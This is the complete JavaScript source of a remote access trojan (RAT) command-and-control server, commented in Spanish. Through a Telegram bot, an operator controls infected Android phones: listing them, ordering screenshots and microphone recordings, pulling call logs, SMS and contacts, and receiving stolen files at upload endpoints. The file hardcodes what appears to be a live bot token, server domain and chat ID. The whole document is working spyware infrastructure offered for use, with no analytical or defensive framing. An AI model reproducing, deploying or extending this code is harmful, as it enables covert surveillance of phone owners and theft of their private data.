// RAT C2 Server - Lógica Original Restaurada y Hardcoded
// Este código replica el flujo exacto: Seleccionar Dispositivo -> Seleccionar Acción -> Ejecutar
// Incluye correcciones para Railway y Seguridad.

const express = require('express'),
    http = require('http'),
    { Server } = require('socket.io'),
    TelegramBot = require('node-telegram-bot-api'),
    fs = require('fs'),
    multer = require('multer');

// ==================================================================
// 🚨 --- ZONA DE CONFIGURACIÓN MANUAL (HARDCODED) --- 🚨
// ==================================================================

// 1. PEGA TU TOKEN DE TELEGRAM AQUÍ
const MANUAL_TOKEN = "8379870959:AAG35f93yFwWw5Qh-O-8M1fHNxMxAPPQ7J8"; 

// 2. PEGA TU DOMINIO DE RAILWAY AQUÍ (Sin barra al final)
const MANUAL_DOMAIN = "ratserver-production-96a6.up.railway.app";

// 3. PEGA TU ID DE CHAT DE TELEGRAM AQUÍ
const MANUAL_CHAT_ID = "6775348523";

// ==================================================================

// Validación de Credenciales
if (MANUAL_TOKEN.includes("PEGAR") || MANUAL_CHAT_ID.includes("PEGAR")) {
    console.error("❌ ERROR: Faltan credenciales en server.js");
    process.exit(1);
}

// Configuración de Directorios
const FILE_DIR = 'file';
if (!fs.existsSync(FILE_DIR)) try { fs.mkdirSync(FILE_DIR); } catch (e) {}

// Inicialización
const bot = new TelegramBot(MANUAL_TOKEN.trim(), { polling: true });
const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.json());
app.use(express.static('HTML'));

// --- Estado del Sistema ---
const connectedDevices = new Map(); // Guarda los sockets de los dispositivos
const currentActions = new Map();   // Máquina de estados: Guarda qué está haciendo el usuario (chatId -> estado)
const selectedDevice = new Map();   // Guarda qué dispositivo seleccionó el usuario (chatId -> deviceId)

// Configuración Multer
const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, FILE_DIR),
    filename: (req, file, cb) => cb(null, Date.now() + '-' + file.originalname)
});
const upload = multer({ storage: storage });

// --- Rutas HTTP (Entrada de datos desde Android) ---

app.post('/upload', upload.single('file'), (req, res) => {
    const deviceId = req.headers['currentTarget'];
    if (deviceId && connectedDevices.get(deviceId)) {
        bot.sendMessage(MANUAL_CHAT_ID, 
            `<b>✯ Archivo Recibido ✯</b>\n\nDe: ${connectedDevices.get(deviceId).model}\nArchivo: ${req.file.originalname}\nURL: ${MANUAL_DOMAIN}/file/${req.file.filename}`, 
            { parse_mode: 'HTML' }
        );
    }
    res.send('Done');
});

app.post('/text', (req, res) => {
    const deviceId = req.headers['currentTarget'];
    if (deviceId && connectedDevices.get(deviceId)) {
        bot.sendMessage(MANUAL_CHAT_ID, 
            `<b>✯ Datos Recibidos ✯</b>\n\nDe: ${connectedDevices.get(deviceId).model}\n\n${req.body.text}`, 
            { parse_mode: 'HTML' }
        );
    }
    res.send('Done');
});

// --- Lógica Socket.IO (Conexión Android) ---

io.on('connection', socket => {
    const h = socket.handshake.headers;
    const deviceId = h['currentTarget'];
    const model = h['model'];

    if (deviceId && !connectedDevices.get(deviceId)) {
        console.log(`[Socket] Nuevo dispositivo: ${model}`);
        connectedDevices.set(deviceId, {
            socket: socket,
            model: model,
            version: h['version'],
            ip: h['host'],
            id: deviceId
        });

        bot.sendMessage(MANUAL_CHAT_ID, 
            `<b>✯ Nuevo Dispositivo Conectado ✯</b>\n\nModelo: ${model}\nIP: ${h['host']}\nID: ${deviceId}`, 
            { parse_mode: 'HTML' }
        );
    }

    socket.on('disconnect', () => {
        if (connectedDevices.has(deviceId)) {
            bot.sendMessage(MANUAL_CHAT_ID, `<b>✯ Dispositivo Desconectado ✯</b>\nModelo: ${model}`, { parse_mode: 'HTML' });
            connectedDevices.delete(deviceId);
        }
    });

    socket.on('commend', data => {
        bot.sendMessage(MANUAL_CHAT_ID, `<b>Respuesta:</b>\n${data}`, { parse_mode: 'HTML' });
    });
});

// --- Lógica del Bot (RESTAURACIÓN DEL FLUJO ORIGINAL) ---

bot.on('message', async msg => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (!text) return;
    
    // SEGURIDAD: Solo tú puedes usar el bot
    if (String(chatId) !== String(MANUAL_CHAT_ID)) return;

    // 1. Menú Principal
    if (text === '/start' || text === '✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯') {
        currentActions.delete(chatId); // Reset estado
        selectedDevice.delete(chatId); // Reset selección
        
        bot.sendMessage(chatId, 
            `<b>✯ DOGERAT C2 ✯</b>\nDispositivos: ${connectedDevices.size}`, 
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']],
                    resize_keyboard: true
                }
            }
        );
    }

    // 2. Listar Dispositivos (Para seleccionar uno específico)
    else if (text === '✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯') {
        if (connectedDevices.size === 0) {
            return bot.sendMessage(chatId, 'No hay dispositivos conectados.');
        }
        let list = [];
        connectedDevices.forEach((v, k) => list.push([v.model])); // Usamos el modelo como botón
        list.push(['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']);
        
        bot.sendMessage(chatId, '<b>Selecciona un dispositivo para controlar:</b>', {
            parse_mode: 'HTML',
            reply_markup: { keyboard: list, resize_keyboard: true }
        });
    }

    // 3. Menú de Acciones (Solo aparece si hay un dispositivo seleccionado o es acción global)
    else if (text === '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯') {
        const keyboard = [
            ['✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯', '✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯'],
            ['✯ 𝙲𝚊𝚕𝚕𝚜 ✯', '✯ 𝚂𝙼𝚂 ✯', '✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯'],
            ['✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯', '✯ 𝚃𝚘𝚊𝚜𝚝 ✯'],
            ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']
        ];
        bot.sendMessage(chatId, '<b>Selecciona una acción:</b>', {
            parse_mode: 'HTML',
            reply_markup: { keyboard: keyboard, resize_keyboard: true }
        });
    }

    // 4. Lógica de Selección de Dispositivo (Cuando pulsas el nombre del móvil)
    else {
        // ¿El texto coincide con el nombre de un dispositivo conectado?
        let targetId = null;
        connectedDevices.forEach((dev, id) => {
            if (text === dev.model) targetId = id;
        });

        if (targetId) {
            // USUARIO SELECCIONÓ UN DISPOSITIVO
            selectedDevice.set(chatId, targetId);
            bot.sendMessage(chatId, `<b>Has seleccionado: ${text}</b>\nAhora ve a "Action" para enviar comandos.`, { parse_mode: 'HTML' });
            return;
        }

        // 5. Ejecución de Comandos
        // Verificamos si tenemos un dispositivo seleccionado
        const currentTargetId = selectedDevice.get(chatId);
        const device = connectedDevices.get(currentTargetId);
        
        // Comandos Directos (No requieren input extra)
        if (text === '✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯') {
            if (device) {
                device.socket.emit('commend', 'screenshot');
                bot.sendMessage(chatId, 'Comando Screenshot enviado.');
            } else {
                bot.sendMessage(chatId, '⚠️ Primero selecciona un dispositivo en "Devices".');
            }
        }
        else if (text === '✯ 𝙲𝚊𝚕𝚕𝚜 ✯') {
            if (device) {
                device.socket.emit('commend', 'calls');
                bot.sendMessage(chatId, 'Pidiendo historial de llamadas...');
            }
        }
        else if (text === '✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯') {
            if (device) {
                device.socket.emit('commend', 'contacts');
                bot.sendMessage(chatId, 'Pidiendo contactos...');
            }
        }
        
        // Comandos con Input (Estado intermedio)
        else if (text === '✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯') {
            if (device) {
                currentActions.set(chatId, 'await_mic_duration');
                bot.sendMessage(chatId, 'Escribe la duración en segundos (ej: 10):');
            }
        }
        else if (text === '✯ 𝚃𝚘𝚊𝚜𝚝 ✯') {
            if (device) {
                currentActions.set(chatId, 'await_toast_msg');
                bot.sendMessage(chatId, 'Escribe el mensaje para mostrar en el Toast:');
            }
        }

        // 6. Manejo de Inputs (Respuestas a preguntas del bot)
        else if (currentActions.get(chatId) === 'await_mic_duration') {
            if (device && !isNaN(text)) {
                device.socket.emit('microphone', { duration: parseInt(text) });
                bot.sendMessage(chatId, `Grabando ${text} segundos...`);
                currentActions.delete(chatId);
            }
        }
        else if (currentActions.get(chatId) === 'await_toast_msg') {
            if (device) {
                device.socket.emit('toast', { message: text });
                bot.sendMessage(chatId, `Toast enviado: "${text}"`);
                currentActions.delete(chatId);
            }
        }
    }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
